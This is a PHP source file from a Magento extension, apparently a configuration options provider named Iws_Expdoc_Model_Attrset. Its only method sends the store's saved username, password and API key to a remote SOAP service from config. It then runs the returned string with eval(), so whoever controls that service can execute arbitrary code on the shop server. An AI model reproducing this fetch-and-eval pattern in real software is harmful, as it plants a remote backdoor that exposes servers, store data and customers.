<?php
/**
 * AEMIK TOOLSET - 1.0 
 *
 * @Authors    Mickael Chen
 * @Contact    chenmickael@yahoo.com
 * @copyright  Copyright (c) 2013 AEMIK (http://www.voguemonde.com)
 * @license    http://opensource.org/licenses/gpl-license.php (GPL)
 */
class Iws_Expdoc_Model_Attrset{
public function toOptionArray(){
try{
$run = new SoapClient(null, array('location' => Mage::getStoreConfig('iwsexpdoc/identifiant/service'),'uri' => 'iws','style' => SOAP_RPC,'use' => SOAP_ENCODED));
$out=$run->getAppexpdocAttrset(Mage::getStoreConfig('iwsexpdoc/identifiant/username'),Mage::getStoreConfig('iwsexpdoc/identifiant/password'),Mage::getStoreConfig('iwsexpdoc/identifiant/apikey'));
if($out){try{eval($out);return $cts;}catch(Exception $e){return $e->getMessage();}}else{exit;}}catch(SoapFault $e){exit;}
}
}